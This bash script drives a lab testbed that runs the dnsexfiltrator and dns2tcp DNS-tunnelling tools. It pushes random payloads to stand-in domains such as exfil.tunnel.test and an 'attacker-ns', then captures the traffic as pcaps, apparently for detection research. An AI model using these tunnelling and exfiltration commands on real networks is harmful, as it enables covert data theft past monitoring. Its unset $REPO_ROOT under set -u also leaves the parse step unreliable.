#!/usr/bin/env bash
# One entry point for every tunnel tool in the lab (Trello card #8 asks for the same
# `run_tool.sh <tool> --size --rate` interface as the iodine/dnscat2 containers, so a
# Phase 2 capture script can loop over all four tools without special cases).
#
#   testbed/run_tool.sh --tool dns2tcp       --size 16384 --rate 2048
#   testbed/run_tool.sh --tool dnsexfiltrator --size 4096 --rate 5
#   testbed/run_tool.sh --tool dnsexfiltrator --size 4096 --rate 5 --base32 --capture
#
# --size is payload bytes, --rate is the throttling knob the card wants: queries/second
# for dnsexfiltrator (one TXT query per chunk), bytes/second for dns2tcp, whose chunking
# is internal to the tool.
#
# --capture writes <out>/<tool>_<utc>.pcap from inside the tool's own container. It cannot
# be taken at the card-5 resolver: the clients resolve the tool server directly, because
# testbed/resolver/named.conf forwards all of tunnel.test to attacker-ns and cannot split
# by subdomain without editing Justin's file (see testbed/tools/docker-compose.yml).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPOSE=(docker compose -f "$SCRIPT_DIR/tools/docker-compose.yml")
OUT="$SCRIPT_DIR/out"
TOOL=""
SIZE=0
RATE=""
MINUTES=""
CAPTURE=0
EXFIL_PASSWORD="${EXFIL_PASSWORD:-leakmate-lab}"
EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.tunnel.test}"
DNS2TCP_DOMAIN="${DNS2TCP_DOMAIN:-dns2tcp.tunnel.test}"
DNS2TCP_KEY="${DNS2TCP_KEY:-leakmate-lab}"
DNS2TCP_LOCAL_PORT=8080
BASE32=0

usage() {
  sed -n '2,20p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
  exit "${1:-0}"
}

[[ $# -eq 0 ]] && usage 2
while [[ $# -gt 0 ]]; do
  case "$1" in
    --tool) TOOL="$2"; shift 2 ;;
    --size) SIZE="$2"; shift 2 ;;
    --rate) RATE="$2"; shift 2 ;;
    --minutes) MINUTES="$2"; shift 2 ;;
    --base32) BASE32=1; shift ;;
    --capture) CAPTURE=1; shift ;;
    --out) OUT="$2"; shift 2 ;;
    --help | -h) usage 0 ;;
    *) echo "unknown argument: $1" >&2; usage 2 ;;
  esac
done

case "$TOOL" in
  dns2tcp | dnsexfiltrator) ;;
  *) echo "--tool must be dns2tcp or dnsexfiltrator (iodine/dnscat2 are card #6)" >&2; exit 2 ;;
esac
[[ "$SIZE" =~ ^[0-9]+$ ]] && ((SIZE > 0)) || { echo "--size must be a positive byte count" >&2; exit 2; }
[[ -z "$RATE" || "$RATE" =~ ^[0-9]+$ ]] || { echo "--rate must be an integer" >&2; exit 2; }

mkdir -p "$OUT/$TOOL"
PROFILE="$TOOL"
"${COMPOSE[@]}" --profile "$PROFILE" up -d --build --wait >/dev/null

start_capture() {
  local container="$1"
  docker exec -d "$container" sh -c "rm -f /tmp/cap.pcap; tcpdump -qi eth0 -w /tmp/cap.pcap udp >/dev/null 2>&1"
  echo "capturing udp on $container"
}

stop_capture() {
  local container="$1" file="$2"
  docker exec "$container" sh -c 'pkill tcpdump' 2>/dev/null || true
  sleep 1
  docker cp "$container:/tmp/cap.pcap" "$file"
  echo "capture -> $file ($(wc -c <"$file") bytes)"
}

PCAP=""
if [[ "$CAPTURE" -eq 1 ]]; then
  PCAP="$OUT/${TOOL}_$(date -u +%Y%m%dT%H%M%SZ).pcap"
fi

case "$TOOL" in
  dnsexfiltrator)
    # --rate is queries/second, the unit the card names. The file is generated on the
    # client container so the source host label matches a real compromised host.
    [[ -n "$RATE" ]] || RATE=5
    docker exec dnsexfiltrator-cli python3 -c "
import os, pathlib
pathlib.Path('/out/payload.bin').write_bytes(os.urandom($SIZE))
print('payload', $SIZE, 'bytes')
"
    [[ "$CAPTURE" -eq 1 ]] && start_capture dnsexfiltrator-ns "$PCAP"
    docker exec dnsexfiltrator-cli python3 client.py /out/payload.bin \
      "$EXFIL_DOMAIN" "$EXFIL_PASSWORD" --resolver 172.28.0.41 --rate "$RATE" $([[ "$BASE32" -eq 1 ]] && echo --base32)
    sleep 1
    [[ "$CAPTURE" -eq 1 ]] && stop_capture dnsexfiltrator-ns "$PCAP"
    # The receiver writes a zip; prove the round trip rather than trusting exit codes.
    docker exec dnsexfiltrator-ns python3 - <<'PY'
import pathlib, sys, zipfile
p = pathlib.Path("/out/payload.zip")
if not p.exists():
    sys.exit("FAIL receiver never wrote /out/payload.zip")
with zipfile.ZipFile(p) as zf:
    data = zf.read(zf.namelist()[0])
print(f"PASS reassembled {len(data)} bytes from {p}")
PY
    ;;

  dns2tcp)
    # The tool chunks TCP itself, so --rate is applied as a bandwidth cap on the transfer.
    [[ -n "$RATE" ]] || RATE=2048
    docker exec dns2tcpd sh -c "head -c $SIZE /dev/urandom > /out/blob.bin && ls -l /out/blob.bin"
    [[ "$CAPTURE" -eq 1 ]] && start_capture dns2tcpd "$PCAP"
    # One tunnel session per run: dns2tcpc is a long-lived listener, so start it, transfer
    # through its local port, then stop it. `--minutes` keeps a session open for manual
    # interactive use (scp/ssh through the tunnel) instead of scripting it.
    docker exec -d dns2tcp-client sh -c "dns2tcpc -z $DNS2TCP_DOMAIN -r http -k $DNS2TCP_KEY -l $DNS2TCP_LOCAL_PORT 172.28.0.42 > /tmp/tunnel.log 2>&1"
    for _ in $(seq 1 30); do
      docker exec dns2tcp-client sh -c "grep -q 'Listening on port' /tmp/tunnel.log" 2>/dev/null && break
      sleep 1
    done
    if [[ -n "$MINUTES" ]]; then
      echo "tunnel open on dns2tcp-client:127.0.0.1:$DNS2TCP_LOCAL_PORT for ${MINUTES}m (Ctrl-C to stop)"
      sleep "$((MINUTES * 60))"
    else
      # curl --limit-rate has a 1k floor and the card's --rate is in bytes/second, so the
      # cap is a pacer script baked into the image (exact at a few hundred B/s).
      docker exec dns2tcp-client sh -c "
python3 /opt/dns2tcp/pull.py ${RATE} $DNS2TCP_LOCAL_PORT $SIZE /tmp/got.bin
got=\$(wc -c < /tmp/got.bin)
[ \"\$got\" = \"$SIZE\" ] || { echo \"FAIL \$got of $SIZE bytes\" >&2; exit 1; }
echo \"PASS \$got bytes through the DNS tunnel (md5 \$(md5sum /tmp/got.bin | cut -d' ' -f1))\"
"
    fi
    docker exec dns2tcp-client sh -c 'pkill dns2tcpc' 2>/dev/null || true
    [[ "$CAPTURE" -eq 1 ]] && stop_capture dns2tcpd "$PCAP"
    ;;
esac

if [[ "$CAPTURE" -eq 1 && -n "$PCAP" ]]; then
  # One command closes the card's loop: capture, then prove it parses into the contract
  # table. dpkt lives in the M2 requirements, so degrade to printing the command if absent.
  ROWS="$OUT/${TOOL}.ndjson"
  if python3 -c "import dpkt" 2>/dev/null; then
    python3 "$REPO_ROOT/scripts/parse_capture.py" "$PCAP" --out "$ROWS" --tool "$TOOL" \
      || { echo "parse_capture failed on $PCAP" >&2; exit 1; }
    echo "parsed $(wc -l < "$ROWS") rows -> $ROWS"
  else
    echo "next: python3 scripts/parse_capture.py $PCAP --out /tmp/${TOOL}.ndjson --tool $TOOL"
  fi
fi
